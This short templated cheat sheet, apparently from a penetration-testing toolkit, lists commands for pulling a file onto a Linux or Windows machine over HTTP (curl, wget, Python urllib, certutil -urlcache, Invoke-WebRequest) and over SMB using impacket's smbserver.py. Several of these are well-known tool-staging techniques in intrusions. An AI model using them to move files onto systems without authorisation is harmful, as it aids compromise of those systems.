Download Commands

HTTP

Download commands using HTTP: 

# Linux
curl {{file.url}} > {{file.name}}
wget -O {{file.name}} {{file.url}}
python3 -c 'r=__import__("urllib.request").request.urlopen("{{file.url}}");open("{{file.name}}","wb").write(r.read())'

# Windows
certutil -urlcache -f {{file.url}} {{file.name}}
Invoke-WebRequest -uri {{file.url}} -OutFile {{file.name}}

SMB

Download commands using SMB: 

# Run server_path
python3 ~/impacket/examples/smbserver.py -ip {{ip}} my_share .

# Download file
copy \\{{ip}}\my_share\{{file.name}} {{file.name}}
